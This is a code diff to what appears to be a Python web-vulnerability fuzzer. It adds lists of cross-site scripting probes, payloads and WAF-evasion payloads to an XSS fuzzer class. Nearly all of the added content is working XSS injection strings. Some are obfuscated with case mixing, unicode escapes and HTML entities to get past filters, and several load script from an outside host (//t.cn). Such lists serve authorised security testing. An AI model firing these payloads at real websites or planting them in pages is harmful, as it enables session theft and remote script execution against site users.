@@ -273,6 +273,54 @@ _htmlTemplate = '''
 </html>
 '''
 
+# probe for test xss vuln
+_probes = [
+    """'';!--"<XSS>=&{()}""",
+]
+
+# xss payloads
+_payloads = [
+    '<img src=x onerror=alert(/xss/)>',
+    """<img src="javascript:alert('xss');">""",
+    """<style>@im\\port'\\ja\\vasc\\ript:alert("xss")';</style>""",
+    """<img style="xss:expr/*xss*/ession(alert('xss'))"> """,
+    """<meta http-equiv="refresh" content="0;url=javascript:alert('xss');">""",
+    """<meta http-equiv="refresh" content="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">""",
+    """<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-""",
+]
+
+# payload for waf test
+_waf_payloads = [
+    "<IMG SRC=JaVaScRiPt:alert('xss')>",
+    '<<script>alert("xss");//<</script>',
+    """<img src="javascript:alert('xss')" """,
+    '<a href="javascript%26colon;alert(1)">click',
+    '<a href=javas&#99;ript:alert(1)>click',
+    '<--`<img/src=` onerror=confirm``> --!>',
+    '\'"</Script><Html Onmouseover=(confirm)()//'
+    '<imG/sRc=l oNerrOr=(prompt)() x>',
+    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
+    '<deTails open oNToggle=confi\u0072m()>',
+    '<img sRc=l oNerrOr=(confirm)() x>',
+    '<svg/x=">"/onload=confirm()//',
+    '<svg%0Aonload=%09((pro\u006dpt))()//',
+    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
+    '<sCript x>confirm``</scRipt x>',
+    '<Script x>prompt()</scRiPt x>',
+    '<sCriPt sRc=//t.cn>',
+    '<embed//sRc=//t.cn>',
+    '<base href=//t.cn/><script src=/>',
+    '<object//data=//t.cn>',
+    '<s=" onclick=confirm``>clickme',
+    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
+    '\'"><y///oNMousEDown=((confirm))()>Click',
+    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
+    '<img src=x onerror=confir\u006d`1`>',
+    '<svg/onload=co\u006efir\u006d`1`>',
+    '<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>'
+]
+
+# payload with html 5 features
 # http://html5sec.org
 _h5payloads = [
     '<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>',
@@ -287,6 +335,7 @@ _h5payloads = [
     '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />',
 ]
 
+
 class XSS(Fuzzer):
 
     """generate XSS payload"""
@@ -294,6 +343,10 @@ class XSS(Fuzzer):
     tags = _tags
     events = _events
     htmlTemplate = _htmlTemplate
+    probes = _probes
+    payloads = _payloads
+    waf_payloads = _waf_payloads
+    h5payloads = _h5payloads
 
     def __init__(self, url=""):
         """
